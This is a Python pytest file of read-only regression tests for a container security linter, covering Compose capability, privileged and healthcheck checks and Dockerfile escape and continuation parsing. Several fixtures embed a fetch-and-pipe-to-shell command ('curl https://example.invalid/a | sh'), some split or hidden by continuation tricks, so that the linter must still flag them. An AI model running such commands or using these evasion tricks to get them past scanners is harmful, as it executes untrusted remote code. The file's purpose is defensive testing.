"""Read-only regressions: fixtures are never built or executed."""

import pytest

from fstec_lint import engine
from fstec_lint.checks.compose_checks import check_dangerous_capabilities
from fstec_lint.cli import main
from fstec_lint.parsers.dockerfile import parse_dockerfile


@pytest.mark.parametrize("cap", ["SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE", "SYS_MODULE", "ALL"])
@pytest.mark.parametrize("prefix", ["", "CAP_", "cap_"])
def test_capability_prefix_is_not_bypass(cap, prefix):
    compose = {"services": {"app": {"cap_add": [prefix + cap], "cap_drop": ["ALL"]}}}
    assert check_dangerous_capabilities(compose)


def test_safe_prefixed_capability_not_added_to_policy():
    compose = {"services": {"app": {"cap_add": ["CAP_CHOWN"], "cap_drop": ["ALL"]}}}
    assert not check_dangerous_capabilities(compose)


@pytest.mark.parametrize("escape", ["\\", "`"])
def test_dockerfile_escape_keeps_run_tail(tmp_path, escape):
    path = tmp_path / "Dockerfile"
    path.write_text(
        f"# escape={escape}\nFROM alpine:3.20\nUSER 1000\n"
        f"RUN echo harmless {escape}\n# ignored comment\n; curl https://example.invalid/a | sh\n"
    )
    parsed = parse_dockerfile(path)
    assert len(parsed) == 3
    assert "curl" in parsed[-1]["args"]
    result = engine.scan(path, select=["D005"])
    assert not result.errors
    assert len(result.findings) == 1


@pytest.mark.parametrize("prefix", ["\n", "# ordinary comment\n", "FROM alpine:3.20\n"])
def test_late_escape_directive_does_not_change_default(tmp_path, prefix):
    path = tmp_path / "Dockerfile"
    path.write_text(prefix + "# escape=`\nRUN echo x \\\n; curl https://example.invalid/a | sh\n")
    result = engine.scan(path, select=["D005"])
    assert not result.errors
    assert len(result.findings) == 1


@pytest.mark.parametrize("directive", ["# escape=x", "# escape=`\n# escape=\\"])
def test_invalid_or_duplicate_escape_is_explicit_error(tmp_path, directive):
    path = tmp_path / "Dockerfile"
    path.write_text(directive + "\nFROM alpine:3.20\n")
    assert len(engine.scan(path).errors) == 1
    assert main([str(path), "--fail-on", "none"]) == 3


@pytest.mark.parametrize(
    "field", ["privileged: {enabled: true}", "read_only: []", "healthcheck: nonsense"]
)
def test_checked_field_invalid_shape_is_not_clean(tmp_path, field):
    path = tmp_path / "compose.yaml"
    path.write_text("services:\n  app:\n    " + field + "\n")
    assert len(engine.scan(path).errors) == 1
    assert main([str(path), "--fail-on", "none"]) == 3


@pytest.mark.parametrize("prefix", ["x-note: demo", "version: '3.8'"])
def test_known_root_key_does_not_hide_legacy_service(tmp_path, prefix):
    path = tmp_path / "compose.yaml"
    path.write_text(prefix + "\nweb:\n  privileged: true\n")
    assert len(engine.scan(path).errors) == 1
    assert main([str(path), "--fail-on", "none"]) == 3


def test_valid_extension_fragment_remains_supported(tmp_path):
    path = tmp_path / "compose.yaml"
    path.write_text("x-defaults: &defaults {user: '1000'}\n")
    assert not engine.scan(path).errors


def test_discovery_depth_excess_reports_partial_scan(tmp_path, monkeypatch):
    monkeypatch.setattr(engine, "MAX_SCAN_DEPTH", 3)
    (tmp_path / "compose.yaml").write_text("services: {app: {privileged: true}}")
    deep = tmp_path / "a/b/c/d"
    deep.mkdir(parents=True)
    (deep / "compose.yaml").write_text("services: {app: {privileged: true}}")
    result = engine.scan(tmp_path, select=["C002"])
    assert len(result.errors) == 1
    assert len(result.findings) == 1
    assert main([str(tmp_path), "--fail-on", "none"]) == 3


def test_discovery_entry_excess_is_not_clean(tmp_path, monkeypatch):
    monkeypatch.setattr(engine, "MAX_SCAN_ENTRIES", 2)
    for name in ["a", "b", "compose.yaml"]:
        (tmp_path / name).write_text("services: {app: {privileged: true}}")
    result = engine.scan(tmp_path, select=["C002"])
    assert len(result.errors) == 1
    assert main([str(tmp_path), "--fail-on", "none"]) == 3


@pytest.mark.parametrize("escape", ["\\", "`"])
@pytest.mark.parametrize("count", [1, 2, 3, 4])
def test_dockerfile_continuation_matches_buildkit_not_shell_parity(tmp_path, escape, count):
    path = tmp_path / "Dockerfile"
    path.write_text(
        f"# escape={escape}\nFROM alpine:3.20\nUSER nobody\n"
        + "RUN echo hello "
        + escape * count
        + "\nUSER root\n"
    )
    parsed = parse_dockerfile(path)
    result = engine.scan(path, select=["D001"])
    assert not result.errors
    if count == 1:
        assert parsed[-1]["instruction"] == "RUN"
        assert "USER root" in parsed[-1]["args"]
        assert not result.findings
    else:
        assert parsed[-1] == {"instruction": "USER", "args": "root", "line": 5}
        assert len(result.findings) == 1


@pytest.mark.parametrize("literal", ["true", "TRUE", "True", "y", "yes", "on", "ON"])
def test_compose_true_boolean_literals_are_interpreted(tmp_path, literal):
    path = tmp_path / "compose.yaml"
    path.write_text(
        "services:\n  app:\n    privileged: '" + literal + "'\n"
        "    read_only: '" + literal + "'\n"
        "    healthcheck: {test: ['CMD', 'true'], disable: '" + literal + "'}\n"
    )
    result = engine.scan(path, select=["C002", "C009", "C013"])
    assert not result.errors
    assert {f.rule.id for f in result.findings} == {"C002", "C013"}


@pytest.mark.parametrize("literal", ["false", "FALSE", "False", "n", "no", "off", "OFF"])
def test_compose_false_boolean_literals_are_interpreted(tmp_path, literal):
    path = tmp_path / "compose.yaml"
    path.write_text(
        "services:\n  app:\n    privileged: '" + literal + "'\n"
        "    read_only: '" + literal + "'\n"
        "    healthcheck: {test: ['CMD', 'true'], disable: '" + literal + "'}\n"
    )
    result = engine.scan(path, select=["C002", "C009", "C013"])
    assert not result.errors
    assert {f.rule.id for f in result.findings} == {"C009"}


@pytest.mark.parametrize("value", ["1", "0", "'1'", "'0'", "' true '", "'garbage'", "[]", "{}"])
@pytest.mark.parametrize("field", ["privileged", "read_only", "healthcheck.disable"])
def test_invalid_compose_boolean_is_not_clean(tmp_path, value, field):
    path = tmp_path / "compose.yaml"
    setting = f"healthcheck: {{disable: {value}}}" if "." in field else f"{field}: {value}"
    path.write_text("services: {app: {" + setting + "}}")
    assert len(engine.scan(path).errors) == 1
    assert main([str(path), "--fail-on", "none"]) == 3


@pytest.mark.parametrize(
    "test", ["{}", "{command: true}", "true", "42", "['CMD', {}]", "['CMD', true]"]
)
def test_malformed_healthcheck_test_fails_closed(tmp_path, test):
    path = tmp_path / "compose.yaml"
    path.write_text("services: {app: {healthcheck: {test: " + test + "}}}")
    assert len(engine.scan(path).errors) == 1
    assert main([str(path), "--fail-on", "none"]) == 3


@pytest.mark.parametrize("escape", ["\\", "`"])
def test_blank_lines_in_dockerfile_continuation_do_not_hide_run(tmp_path, escape):
    path = tmp_path / "Dockerfile"
    path.write_text(
        f"# escape={escape}\nFROM alpine:3.20\nUSER nobody\n"
        + f"RUN echo harmless {escape}\n\n   \n# comment\n"
        + "; curl https://example.invalid/a | sh\n"
    )
    result = engine.scan(path, select=["D005"])
    assert not result.errors
    assert len(result.findings) == 1


@pytest.mark.parametrize("escape", ["\\", "`"])
@pytest.mark.parametrize("trailing", ["", " ", "\t"])
def test_dockerfile_continuation_does_not_insert_space(tmp_path, escape, trailing):
    path = tmp_path / "Dockerfile"
    path.write_text(
        f"# escape={escape}\nFROM alpine:3.20\n"
        + f"USER ro{escape}{trailing}\not\n"
        + f"RUN cu{escape}{trailing}\nrl https://example.invalid/a | sh\n"
    )
    parsed = parse_dockerfile(path)
    assert parsed[1]["args"] == "root"
    assert parsed[2]["args"] == "curl https://example.invalid/a | sh"
    result = engine.scan(path, select=["D001", "D005"])
    assert not result.errors
    assert {f.rule.id for f in result.findings} == {"D001", "D005"}


@pytest.mark.parametrize("escape", ["\\", "`"])
def test_dockerfile_continuation_preserves_existing_whitespace(tmp_path, escape):
    path = tmp_path / "Dockerfile"
    path.write_text(f"# escape={escape}\nFROM alpine:3.20\n" + f"RUN echo one {escape}\n  two\n")
    assert parse_dockerfile(path)[-1]["args"] == "echo one   two"
